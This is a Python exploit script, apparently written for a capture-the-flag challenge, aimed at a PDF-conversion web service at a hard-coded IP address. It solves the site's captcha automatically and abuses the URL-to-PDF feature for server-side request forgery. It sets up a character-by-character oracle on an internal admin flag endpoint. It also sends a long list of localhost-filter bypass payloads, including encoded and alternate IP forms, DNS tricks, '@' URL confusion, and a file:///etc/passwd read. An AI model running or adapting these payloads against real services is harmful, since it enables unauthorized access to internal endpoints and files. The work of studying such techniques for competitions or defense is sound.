#!/usr/bin/env python3
"""
Web 2 Doc 1 - SSRF Flag Extraction

The /admin/flag endpoint:
- Requires localhost access (SSRF via PDF converter)
- Blocks X-Fetcher: internal header
- Takes ?i=<index>&c=<char> params
- Returns 200 "OK" if FLAG[i] == c, else 404 "NOT OK"
"""

import requests
import re
import string

BASE_URL = "http://52.59.124.14:5002"
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_-!@#$%^&*()"

def get_captcha(session):
    """Get the main page and extract the captcha challenge."""
    resp = session.get(f"{BASE_URL}/")
    # Look for: Math Challenge: X OP Y = ?
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            return a + b
        elif op == '-':
            return a - b
        elif op == '*':
            return a * b
    return None

def ssrf_fetch(session, internal_url):
    """Use the PDF converter to fetch an internal URL via SSRF."""
    captcha = get_captcha(session)
    if captcha is None:
        print("[!] Could not solve captcha")
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": internal_url,
        "captcha_answer": str(captcha)
    })
    
    return resp

def test_char(session, index, char):
    """Test if FLAG[index] == char by checking the SSRF response."""
    # Try different localhost bypasses
    urls = [
        f"http://127.0.0.1:5002/admin/flag?i={index}&c={char}",
        f"http://localhost:5002/admin/flag?i={index}&c={char}",
        f"http://0.0.0.0:5002/admin/flag?i={index}&c={char}",
    ]
    
    for url in urls[:1]:  # Start with first one
        resp = ssrf_fetch(session, url)
        if resp is None:
            continue
        
        # Check if we got a PDF or an error
        if resp.status_code == 200 and resp.headers.get('Content-Type', '').startswith('application/pdf'):
            # PDF generated - means we got a 200 from internal endpoint ("OK")
            return True
        elif 'error' in resp.text.lower():
            # Check the error message
            try:
                data = resp.json()
                print(f"[DEBUG] Error: {data}")
            except:
                pass
    
    return False

def main():
    session = requests.Session()
    
    # Various localhost bypass techniques
    bypass_urls = [
        # Standard localhost
        "http://127.0.0.1:5002/",
        "http://localhost:5002/",
        "http://0.0.0.0:5002/",
        
        # IPv6
        "http://[::1]:5002/",
        "http://[0:0:0:0:0:0:0:1]:5002/",
        
        # Decimal IP
        "http://2130706433:5002/",  # 127.0.0.1 as decimal
        
        # Octal
        "http://0177.0.0.1:5002/",
        "http://0177.0.0.01:5002/",
        
        # Hex
        "http://0x7f.0x0.0x0.0x1:5002/",
        "http://0x7f000001:5002/",
        
        # Mixed
        "http://127.0.0.1.:5002/",  # Trailing dot
        "http://127.1:5002/",
        "http://127.0.1:5002/",
        
        # URL encoding
        "http://%31%32%37%2e%30%2e%30%2e%31:5002/",
        
        # DNS rebinding / special domains
        "http://localtest.me:5002/",  # Resolves to 127.0.0.1
        "http://127.0.0.1.nip.io:5002/",
        "http://spoofed.burpcollaborator.net/",  # Won't work but for reference
        
        # Using @ for URL confusion
        "http://evil.com@127.0.0.1:5002/",
        
        # Double URL encoding
        "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531:5002/",
        
        # Using file protocol (probably won't work with PDF converter)
        "file:///etc/passwd",
        
        # Zero padding
        "http://127.000.000.001:5002/",
    ]
    
    print("[*] Testing localhost SSRF bypasses...\n")
    
    for url in bypass_urls:
        resp = ssrf_fetch(session, url)
        if resp is None:
            print(f"[-] {url[:50]:50s} -> Captcha failed")
            continue
        
        status = resp.status_code
        content_type = resp.headers.get('Content-Type', 'unknown')
        
        if status == 200 and 'pdf' in content_type.lower():
            print(f"[+] {url[:50]:50s} -> SUCCESS! PDF {len(resp.content)} bytes")
        else:
            try:
                error = resp.json().get('error', 'unknown')[:30]
            except:
                error = resp.text[:30]
            print(f"[-] {url[:50]:50s} -> {status} {error}")

if __name__ == "__main__":
    main()
